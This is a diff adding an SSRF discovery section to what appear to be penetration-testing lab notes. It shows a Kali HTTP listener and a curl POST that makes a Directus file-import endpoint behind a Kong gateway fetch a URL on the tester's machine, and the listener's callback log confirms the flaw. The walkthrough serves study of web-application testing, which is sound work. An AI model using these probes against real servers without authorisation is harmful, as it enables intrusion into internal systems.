@@ -126,3 +126,44 @@ Via: kong/2.2.1
 ## Server-Side Request Forgery Discovery
 Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks a server into making unauthorized requests. Because the request originates from the server, it may access internal resources, such as services on localhost, internal IP ranges, or systems behind firewalls or reverse proxies.
 
+We always want to check `url` parameters in an API or web form for an SSRF vulnerability. 
+
+First, let's determine if we can make it connect back to our Kali machine. We'll need to make sure our HTTP server is running.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
+Since the server returned the error as a JSON message, let's make our POST request use JSON as well.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.203/ssrftest"}' http://apigateway:8000/files/import
+HTTP/1.1 500 Internal Server Error
+Content-Type: application/json; charset=utf-8
+Content-Length: 108
+Connection: keep-alive
+X-Powered-By: Directus
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Access-Control-Expose-Headers: Content-Range
+ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
+Date: Mon, 28 Jul 2025 18:07:42 GMT
+X-Kong-Upstream-Latency: 214
+X-Kong-Proxy-Latency: 0
+Via: kong/2.2.1
+
+{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$
+```
+Then check your HTTP sever:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.130.135 - - [28/Jul/2025 14:07:42] code 404, message File not found
+192.168.130.135 - - [28/Jul/2025 14:07:42] "GET /ssrftest HTTP/1.1" 404 -
+
+```
+This backend service is vulnerable to SSRF. The user agent on the request is Axios, an HTTP client for Node.js.
